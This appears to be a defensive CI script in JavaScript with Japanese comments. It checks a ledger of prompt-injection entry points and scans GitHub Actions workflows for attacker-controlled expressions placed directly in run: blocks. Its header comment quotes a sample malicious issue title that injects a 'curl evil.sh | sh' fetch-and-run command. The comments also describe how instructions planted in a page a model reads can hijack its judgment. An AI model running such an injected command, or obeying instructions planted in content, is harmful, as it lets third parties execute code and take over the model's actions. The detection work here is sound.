#!/usr/bin/env node
/**
 * Prompt Injection / Tool Poisoning の面を検査する。
 *
 *   node scripts/check-injection-surface.mjs           # 表示
 *   node scripts/check-injection-surface.mjs --check   # CI
 *
 * 【「気をつける」では成立しない】
 * 対策は、**どこから外部コンテンツが入るかを数え上げる**ところからしか始まらない。
 * 台帳（data/injection-surface.json）に入口と緩和策と**残る危険**を書き、
 * ここでは機械で確かめられる部分だけを確かめる。
 *
 * 【機械で確かめられる部分】
 * GitHub Actions の script injection。`${{ github.event.* }}` を `run:` の中に
 * 展開すると、**第三者が書いた文字列がそのままシェルとして実行される。**
 * Issue のタイトルに `"; curl evil.sh | sh; #` と書くだけで通る、あの形。
 * これは正規表現で検出できるので検出する。
 *
 * 【機械で確かめられない部分】
 * セッションの判断そのものの汚染。「この手順に従え」と書かれたページを読んで
 * 従わない保証は、モデルの側にしか無い。**台帳の residual_risk に書いて、
 * 消えていないことを消えていないと言い続ける。**
 */

import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { assert, ledgerScenarios, run } from './lib/selftest.mjs';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
export const SURFACE_PATH = path.join(ROOT, 'data/injection-surface.json');
const WORKFLOW_DIR = path.join(ROOT, '.github/workflows');

export const TRUST = ['none', 'partial', 'own'];

/** run: ブロックに直接展開すると危ない式。**第三者が中身を書ける場所。** */
export const UNTRUSTED_EXPR = [
  /\$\{\{\s*github\.event\.issue\.(title|body)/,
  /\$\{\{\s*github\.event\.comment\.body/,
  /\$\{\{\s*github\.event\.pull_request\.(title|body)/,
  /\$\{\{\s*github\.event\.review\.body/,
  /\$\{\{\s*github\.head_ref/,
  /\$\{\{\s*github\.event\.discussion\./,
];

/**
 * ワークフローの `run:` ブロックだけを取り出す。
 * env: 経由で渡すのは安全（シェル変数になるので展開されない）ので、
 * **run: の中に直接書かれている場合だけを問題にする。**
 */
export function scanWorkflow(text, file) {
  const hits = [];
  const lines = text.split('\n');
  let inRun = false, runIndent = 0;
  lines.forEach((line, i) => {
    const m = /^(\s*)(-?\s*)run:\s*(\|[-+]?|>[-+]?)?\s*(.*)$/.exec(line);
    if (m) {
      inRun = true;
      runIndent = m[1].length;
      checkLine(m[4] ?? '', i + 1);
      return;
    }
    if (inRun) {
      const indent = line.search(/\S/);
      if (line.trim() === '') return;
      if (indent <= runIndent) { inRun = false; return; }
      checkLine(line, i + 1);
    }
  });
  function checkLine(s, ln) {
    for (const re of UNTRUSTED_EXPR) {
      if (re.test(s)) {
        hits.push({ file, line: ln, expr: String(re), text: s.trim().slice(0, 90) });
      }
    }
  }
  return hits;
}

export function validate(doc) {
  const problems = [];
  const ids = new Set();
  for (const e of doc.entry_points || []) {
    const at = `entry_points「${e.id || '(id無し)'}」`;
    if (!e.id) problems.push('id の無い入口がある');
    else if (ids.has(e.id)) problems.push(`${at}: id が重複`);
    else ids.add(e.id);
    if (!TRUST.includes(e.trust)) problems.push(`${at}: trust は ${TRUST.join('/')}`);
    if (!e.what) problems.push(`${at}: what が無い`);
    if (!Array.isArray(e.mitigations) || !e.mitigations.length) {
      problems.push(`${at}: mitigations が空 — 緩和策の無い入口は、入口として認識していないのと同じ`);
    }
    // **残る危険を空にできない。**「対策済み」と書けるようにすると、必ずそう書く。
    if (!e.residual_risk) {
      problems.push(`${at}: residual_risk が無い`
        + ' — **「対策済み」と書けるようにすると必ずそう書く。**消えていないものは消えていないと書く');
    }
  }
  if ((doc.entry_points || []).length < 3) problems.push('入口が3つ未満 — 数え上げが足りていない');
  return problems;
}


// ── 自己テスト（**落ちることを確かめる**） ──────────────────────
// 通ることだけ確かめる自己テストは、検査が何も見ていなくても緑になる。
// 壊し方は実データを複製して作る（固定フィクスチャだと台帳と形がずれても気づけない）。
const SELFTEST_BREAKAGES = [
  ['**緩和策の空の入口**は落ちる（入口として認識していないのと同じ）', (d) => { d.entry_points[0].mitigations = []; }],
  ['残存リスクの記載が無ければ落ちる', (d) => { delete d.entry_points[0].residual_risk; }],
  ['知らない trust は落ちる', (d) => { d.entry_points[0].trust = 'たぶん安全'; }],
  ['id の重複は落ちる', (d) => { d.entry_points.push({ ...d.entry_points[0] }); }],
];
const SCENARIOS = ledgerScenarios(
  () => JSON.parse(fs.readFileSync(SURFACE_PATH, 'utf8')),
  (d) => validate(d),
  SELFTEST_BREAKAGES,
);

const isMain = process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url);
if (isMain) {
  if (process.argv.includes('--selftest')) process.exit(run(SCENARIOS) === 0 ? 0 : 1);
  const doc = JSON.parse(fs.readFileSync(SURFACE_PATH, 'utf8'));
  const problems = validate(doc);

  const files = fs.existsSync(WORKFLOW_DIR)
    ? fs.readdirSync(WORKFLOW_DIR).filter((f) => f.endsWith('.yml') || f.endsWith('.yaml')) : [];
  const hits = files.flatMap((f) => scanWorkflow(fs.readFileSync(path.join(WORKFLOW_DIR, f), 'utf8'), f));

  console.log(`注入面 — 外部コンテンツの入口 ${doc.entry_points.length}件\n`);
  for (const e of doc.entry_points) {
    console.log(`  [${e.trust.padEnd(7)}] ${e.what}`);
    for (const m of e.mitigations) console.log(`      ✓ ${m}`);
    console.log(`      **残る危険:** ${e.residual_risk}`);
  }
  console.log(`\n  ワークフローの script injection 検査: ${files.length} ファイル`);
  if (hits.length) {
    for (const h of hits) console.log(`    ${h.file}:${h.line}  ${h.text}`);
    problems.push(`run: に第三者が書ける式を直接展開している ${hits.length}件`
      + ' — **env: 経由で渡すこと**（シェル変数になるので展開されない）');
  } else {
    console.log('    run: に第三者が書ける式の直接展開なし。');
  }
  console.log('\n  **機械で確かめられるのはここまで。**セッションの判断そのものの汚染');
  console.log('  （「この手順に従え」と書かれたページを読んで従わない保証）は、');
  console.log('  モデルの側にしか無い。台帳の residual_risk に書いてある。');

  if (problems.length) {
    console.error('\n注入面: 問題');
    for (const p of problems) console.error(`  - ${p}`);
    process.exit(1);
  }
  if (process.argv.includes('--check')) {
    if (run(SCENARIOS) !== 0) process.exit(1);
    console.log('\n入口の棚卸しと、機械で見える範囲に問題なし。');
  }
}
